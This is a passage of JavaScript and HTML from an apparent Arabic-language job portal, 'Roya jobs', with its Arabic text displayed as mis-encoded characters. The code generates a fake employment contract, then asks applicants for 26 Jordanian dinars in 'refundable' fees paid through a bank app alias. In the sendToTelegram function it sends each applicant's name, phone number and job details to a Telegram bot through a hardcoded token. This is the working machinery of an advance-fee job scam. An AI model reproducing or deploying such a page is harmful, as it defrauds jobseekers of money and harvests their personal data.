      const section = document.getElementById('stepsSection');
      section.innerHTML = `<h2>Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª Ø§Ù„ØªÙˆØ¸ÙŠÙ Ø§Ù„Ø±Ø³Ù…ÙŠØ©</h2>`;
      for(let i=0; i<=idx; i++) {
        let st = steps[i];
        section.innerHTML += `<div class="step ${st.class}">${st.txt} ${i==idx?'<span class="loader"></span>':''}</div>`;
      }
      if(idx<steps.length-1){
        setTimeout(()=>{ showSteps(req, idx+1); }, steps[idx].time);
      }else{
        let r = {...req, status:"contract"};
        setRequestData(r);
        setTimeout(()=>handleRequestFlow(r), 1500);
      }
    }

    // Ø¹Ù‚Ø¯ Ø¹Ù…Ù„ Ø±Ø³Ù…ÙŠ ÙˆØ§Ù‚Ø¹ÙŠ
    function showContract(req) {
      const section = document.getElementById('contractSection');
      section.innerHTML = `
        <div class="contract-h">Ø§ØªÙØ§Ù‚ÙŠØ© Ø¹Ù…Ù„ Ø±Ø³Ù…ÙŠØ©</div>
        <table class="contract-table" id="contractTable">
          <tr>
            <th class="contract-row-title">Ø§Ø³Ù… Ø§Ù„Ù…ÙˆØ¸Ù</th>
            <td class="contract-row-val">${req.user.username}</td>
          </tr>
          <tr>
            <th>Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ</th>
            <td>${req.user.phone}</td>
          </tr>
          <tr>
            <th>Ø§Ù„Ù…Ø­Ø§ÙØ¸Ø©</th>
            <td>${req.location}</td>
          </tr>
          <tr>
            <th>Ø§Ù„Ù…Ø³Ù…Ù‰ Ø§Ù„ÙˆØ¸ÙŠÙÙŠ</th>
            <td>${req.emoji||jobEmoji(req.jobTitle)} ${req.jobTitle}</td>
          </tr>
          <tr>
            <th>Ø§Ù„Ø±Ø§ØªØ¨ Ø§Ù„Ø´Ù‡Ø±ÙŠ</th>
            <td>${req.salary} Ø¯ÙŠÙ†Ø§Ø± Ø£Ø±Ø¯Ù†ÙŠ</td>
          </tr>
          <tr>
            <th>Ø³Ø§Ø¹Ø§Øª Ø§Ù„Ø¹Ù…Ù„</th>
            <td>${req.hours} Ø³Ø§Ø¹Ø§Øª ÙŠÙˆÙ…ÙŠØ§Ù‹</td>
          </tr>
          <tr>
            <th>ØªØ§Ø±ÙŠØ® Ø§Ù„Ø§ØªÙØ§Ù‚ÙŠØ©</th>
            <td>${new Date().toLocaleDateString('ar-JO')}</td>
          </tr>
        </table>
        <div class="contract-agree">
          <b>Ø¨Ù…ÙˆØ¬Ø¨ Ù‡Ø°Ù‡ Ø§Ù„Ø§ØªÙØ§Ù‚ÙŠØ©ØŒ Ø£Ù‚Ø± Ø¨Ø£Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø£Ø¹Ù„Ø§Ù‡ ØµØ­ÙŠØ­Ø©ØŒ ÙˆØ£Ù„ØªØ²Ù… Ø¨Ø§Ù„Ø­Ø¶ÙˆØ± ÙˆØ§Ù„Ù‚ÙŠØ§Ù… Ø¨Ù…Ù‡Ø§Ù…ÙŠ Ø§Ù„ÙˆØ¸ÙŠÙÙŠØ© Ø­Ø³Ø¨ Ø§Ù„Ù…ØªÙÙ‚ Ø¹Ù„ÙŠÙ‡ Ù…Ø¹ Ø§Ù„Ø¬Ù‡Ø© Ø§Ù„Ù…Ø§Ù†Ø­Ø© Ù„Ù„ÙˆØ¸ÙŠÙØ©.</b>
        </div>
        <button class="contract-img-btn" onclick="nextToPayment()" style="background:#39bb6c;margin-top:8px;">Ø§Ø³ØªÙ…Ø±Ø§Ø± Ù„Ù„Ø¹Ù…Ù„</button>
        <button class="cancel-btn" onclick="cancelRequest()">Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø·Ù„Ø¨</button>
        <div class="contract-footer">Ø§Ù„Ø¹Ù‚Ø¯ ØµØ§Ø¯Ø± Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠØ§Ù‹ Ø¹Ù† Ø¨ÙˆØ§Ø¨Ø© Ø±Ø¤ÙŠØ§ Ù„Ù„ÙˆØ¸Ø§Ø¦Ù</div>
      `;
    }
    // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¹Ù‚Ø¯ ÙƒØµÙˆØ±Ø© PNG
    function downloadContractImg() {
      let table = document.getElementById('contractTable').parentElement;
      html2canvas(table, {backgroundColor:"#fff"}).then(canvas=>{
        let link = document.createElement("a");
        link.download = "Ø¹Ù‚Ø¯_Ø¹Ù…Ù„_Ø±Ø¤ÙŠØ§.png";
        link.href = canvas.toDataURL();
        link.click();
      });
    }
    function nextToPayment() {
      let req = getRequestData();
      let r = {...req, status:"payment"};
      setRequestData(r);
      handleRequestFlow(r);
    }

    // Ø¹Ø±Ø¶ Ø§Ù„Ø¯ÙØ¹
    function showPayment(req) {
      const section = document.getElementById('paymentSection');
      section.innerHTML = `
      <div class="payment-title">Ø±Ø³ÙˆÙ… Ø­Ø¬Ø² Ù…ÙƒØ§Ù†Ùƒ Ø§Ù„ÙˆØ¸ÙŠÙÙŠ (Ù‚Ø§Ø¨Ù„Ø© Ù„Ù„Ø§Ø³ØªØ±Ø¯Ø§Ø¯)</div>
      <div class="payment-list">
        <div>Ø´Ù‡Ø§Ø¯Ø© Ø¹Ø¯Ù… Ù…Ø­ÙƒÙˆÙ…ÙŠØ© Ø±Ø³Ù…ÙŠØ©: 10 Ø¯.Ø£</div>
        <div>Ø¶Ø±ÙŠØ¨Ø© ÙˆØ±Ø³ÙˆÙ… Ø·ÙˆØ§Ø¨Ø¹: 11 Ø¯.Ø£</div>
        <div>Ø±Ø³ÙˆÙ… Ø­Ø¬Ø² ÙˆØ¥Ø¬Ø±Ø§Ø¡Ø§Øª: 5 Ø¯.Ø£</div>
      </div>
      <div class="payment-total">Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ: 26 Ø¯ÙŠÙ†Ø§Ø± Ø£Ø±Ø¯Ù†ÙŠ</div>
      <div class="payment-instructions">
        Ù„Ø¯ÙØ¹ Ø§Ù„Ø±Ø³ÙˆÙ…: Ø§Ø³ØªØ®Ø¯Ù… ØªØ·Ø¨ÙŠÙ‚ ÙƒÙ„ÙŠÙƒ (Ø§Ù„Ø¨Ù†Ùƒ Ø§Ù„Ø£Ù‡Ù„ÙŠ)<br>
        Ø§Ù„Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ¹Ø§Ø±: <b style="color:#7f38c0;">royajobs</b>
      </div>
      <div class="payment-steps">
        - ÙŠØªÙ… Ø§Ø³ØªØ±Ø¯Ø§Ø¯ Ø§Ù„Ù…Ø¨Ù„Øº ÙÙŠ Ø­Ø§Ù„ Ø§Ù„Ø¥Ø¨Ù„Ø§Øº Ø§Ù„Ù…Ø³Ø¨Ù‚ Ø¨Ø¹Ø¯Ù… Ø§Ù„Ø­Ø¶ÙˆØ±.<br>
        - Ù„Ø§ ÙŠÙ…ÙƒÙ†Ùƒ ØªÙ‚Ø¯ÙŠÙ… Ø·Ù„Ø¨ Ø¬Ø¯ÙŠØ¯ Ù‚Ø¨Ù„ Ø§Ù„Ø¯ÙØ¹ Ø£Ùˆ Ø§Ù„Ø¥Ù„ØºØ§Ø¡.<br>
        - Ø£Ø±Ø³Ù„ Ø§Ù„Ù…Ø¨Ù„Øº Ø«Ù… Ø§Ø¶ØºØ· "Ù„Ù‚Ø¯ Ø¯ÙØ¹Øª".<br>
      </div>
      <button class="paid-btn" onclick="markPaid()">Ù„Ù‚Ø¯ Ø¯ÙØ¹Øª</button>
      <button class="cancel-btn" onclick="cancelRequest()">Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø·Ù„Ø¨</button>
      `;
    }
    // Ø¨Ø¹Ø¯ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ "Ù„Ù‚Ø¯ Ø¯ÙØ¹Øª"
    function markPaid() {
      let req = getRequestData();
      let r = {...req, status:"pending", paid:true};
      setRequestData(r);
      // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø¨ÙˆØª
      sendToTelegram({
        ...req.user,
        job: req.jobTitle,
        salary: req.salary,
        hours: req.hours,
        location: req.location,
        step: "ØªÙ… Ø§Ù„Ø¯ÙØ¹"
      });
      handleRequestFlow(r);
    }
    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„Ø¨ÙˆØª ØªÙ„Ø¬Ø±Ø§Ù…
    function sendToTelegram(data) {
      const token = "8364248948:AAFWbzdx1bMnjaU6xY218i0V7uAfXQXJPFM";
      const chat_id = "-4887772246";
      let msg = `ğŸ“ Ø¥Ø´Ø¹Ø§Ø± Ø¬Ø¯ÙŠØ¯ (Ù…Ø¯ÙÙˆØ¹):\n`+
        `Ø§Ù„Ø§Ø³Ù…: ${data.username}\n`+
        `Ø§Ù„Ù‡Ø§ØªÙ: ${data.phone}\n`+
        `Ø§Ù„Ù…Ø­Ø§ÙØ¸Ø©: ${data.governorate||data.location}\n`+
        `Ø§Ù„ÙˆØ¸ÙŠÙØ©: ${data.job}\n`+
        `Ø§Ù„Ø±Ø§ØªØ¨: ${data.salary} Ø¯.Ø£\n`+
        `Ø³Ø§Ø¹Ø§Øª Ø§Ù„Ø¹Ù…Ù„: ${data.hours}\n`+
        `---\nØªÙ… Ø¯ÙØ¹ Ø§Ù„Ø±Ø³ÙˆÙ….`;
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({chat_id, text:msg})
      });
    }
    // Ù‚ÙŠØ¯ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¯ÙØ¹
    function showPendingPayment(req) {
      const section = document.getElementById('paymentSection');
      section.innerHTML = `
      <div class="pending-message">ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ø¥Ø´Ø¹Ø§Ø± Ø§Ù„Ø¯ÙØ¹ØŒ Ø·Ù„Ø¨Ùƒ Ù‚ÙŠØ¯ Ø§Ù„ØªØ­Ù‚Ù‚...</div>
      <div class="info-message">Ø³ÙŠØªÙ… Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹Ùƒ Ù‚Ø±ÙŠØ¨Ù‹Ø§ Ù„Ø¥ØªÙ…Ø§Ù… Ø§Ù„ØªÙˆØ¸ÙŠÙ Ø¨Ø¥Ø°Ù† Ø§Ù„Ù„Ù‡.<br>Ø¨Ø¥Ù…ÙƒØ§Ù†Ùƒ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¹Ù‚Ø¯ Ù…Ø¬Ø¯Ø¯Ù‹Ø§.</div>
      <button class="contract-img-btn" onclick="downloadContractImg()">ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¹Ù‚Ø¯ (ØµÙˆØ±Ø© PNG)</button>
      <button class="again-btn" onclick="cancelRequest()">Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø·Ù„Ø¨ ÙˆØªÙ‚Ø¯ÙŠÙ… Ø¬Ø¯ÙŠØ¯</button>
      `;
    }
    // Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø·Ù„Ø¨
    function cancelRequest() {
      if(confirm('Ù‡Ù„ ØªØ±ÙŠØ¯ Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø·Ù„Ø¨ Ø¨Ø§Ù„ÙØ¹Ù„ØŸ')) {
        clearRequestData();
        notify('ØªÙ… Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø·Ù„Ø¨!');
        hideAllSections();
        document.getElementById('mainSection').style.display = "block";
        loadJobs();
      }
    }
    // Ø¥Ø®ÙØ§Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ù‚Ø³Ø§Ù… (Ù…Ø§ Ø¹Ø¯Ø§ section Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©)
    function hideAllSections() {
      ['mainSection','stepsSection','contractSection','paymentSection'].forEach(id=>{
        let sec = document.getElementById(id);
        if(sec) sec.style.display = "none";
      });
    }
    function showSection(id) {
      hideAllSections();
      document.getElementById(id).style.display = "block";
    }
    // Ø¯ÙˆØ§Ù„ global Ù„Ù„Ø£Ø²Ø±Ø§Ø±
    window.applyJob = applyJob;
    window.downloadContractImg = downloadContractImg;
    window.nextToPayment = nextToPayment;
    window.markPaid = markPaid;
    window.cancelRequest = cancelRequest;
  </script>
</body>
</html>
